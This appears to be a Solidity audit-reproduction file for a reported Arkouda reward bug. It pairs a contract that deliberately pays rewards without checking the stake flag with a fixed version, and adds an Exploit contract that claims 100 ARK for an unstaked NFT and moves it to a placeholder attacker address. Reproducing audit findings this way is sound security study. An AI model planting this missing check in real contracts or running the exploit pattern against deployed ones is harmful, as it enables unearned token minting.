// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

/*
 * AuditVault 56420 — CWBC Arkouda reward math (Zokyo, 2022-02).
 *
 * stakeCBWC records that an NFT is staked, but claimReward never reads that
 * flag. Pending Arkouda is `daysHeld * BASE_REWARD` for any owner. An owner
 * who never staked mints the same 100 ARK (10 days * 10 ARK) as an owner who
 * did. Rewards have already been started, so this is not the pre-start claim.
 *
 * Acquisition time is stored as 1. Block timestamp is 1 + 10 days for the
 * whole transaction. No warp inside run().
 */

contract Arkouda {
    uint256 public constant BASE_REWARD = 10 ether;

    uint256 public rewardGenerationStartTime;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public acquiredAt;
    mapping(uint256 => bool) public staked;

    uint256 public stakeCalls;
    uint256 public lastDays;
    uint256 public lastReward;
    uint256 public ignoredStakeFlag;

    constructor() {
        rewardGenerationStartTime = 1;
    }

    function mintNft(address to, uint256 id, uint256 whenAcquired) external {
        require(ownerOf[id] == address(0), "exists");
        ownerOf[id] = to;
        acquiredAt[id] = whenAcquired;
    }

    function stakeCBWC(uint256 id) external {
        require(ownerOf[id] == msg.sender, "holder");
        staked[id] = true;
        stakeCalls += 1;
    }

    function claimReward(uint256 tokenId) external {
        require(ownerOf[tokenId] == msg.sender, "holder");
        require(rewardGenerationStartTime != 0, "not started");
        require(block.timestamp >= rewardGenerationStartTime, "before start");
        uint256 daysHeld = (block.timestamp - acquiredAt[tokenId]) / 1 days;
        lastDays = daysHeld;
        // Read the stake flag and then do not use it.
        ignoredStakeFlag = staked[tokenId] ? 1 : 0;
        // @> VULN:
        lastReward = daysHeld * BASE_REWARD;
        balanceOf[msg.sender] += lastReward;
        totalSupply += lastReward;
        acquiredAt[tokenId] = block.timestamp;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ArkoudaFixed {
    uint256 public constant BASE_REWARD = 10 ether;
    uint256 public rewardGenerationStartTime = 1;
    mapping(address => uint256) public balanceOf;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public acquiredAt;
    mapping(uint256 => bool) public staked;

    function mintNft(address to, uint256 id, uint256 whenAcquired) external {
        ownerOf[id] = to;
        acquiredAt[id] = whenAcquired;
    }

    function stakeCBWC(uint256 id) external {
        require(ownerOf[id] == msg.sender, "holder");
        staked[id] = true;
    }

    function claimReward(uint256 tokenId) external {
        require(ownerOf[tokenId] == msg.sender, "holder");
        require(staked[tokenId], "not staked");
        uint256 daysHeld = (block.timestamp - acquiredAt[tokenId]) / 1 days;
        uint256 reward = daysHeld * BASE_REWARD;
        balanceOf[msg.sender] += reward;
    }
}

contract Staker {
    function stakeAndClaim(Arkouda a, uint256 id) external {
        a.stakeCBWC(id);
        a.claimReward(id);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant PURCHASED_AT = 1;

    Arkouda public arkouda;
    Staker public staker;
    uint256 public unstakedMint;
    uint256 public stakedMint;

    function run() external {
        require(block.timestamp >= PURCHASED_AT + 10 days, "one block at day 10");
        arkouda = new Arkouda();
        staker = new Staker();

        arkouda.mintNft(address(this), 1, PURCHASED_AT);
        arkouda.mintNft(address(staker), 2, PURCHASED_AT);

        arkouda.claimReward(1);
        unstakedMint = arkouda.lastReward();
        require(arkouda.staked(1) == false, "nft1 staked");
        require(arkouda.ignoredStakeFlag() == 0, "flag");

        staker.stakeAndClaim(arkouda, 2);
        stakedMint = arkouda.lastReward();

        require(unstakedMint == 100 ether, "unstaked paid");
        require(stakedMint == 100 ether, "same as staked");
        require(arkouda.balanceOf(address(this)) == unstakedMint, "bal");
        arkouda.transfer(ATTACKER, unstakedMint);
    }
}
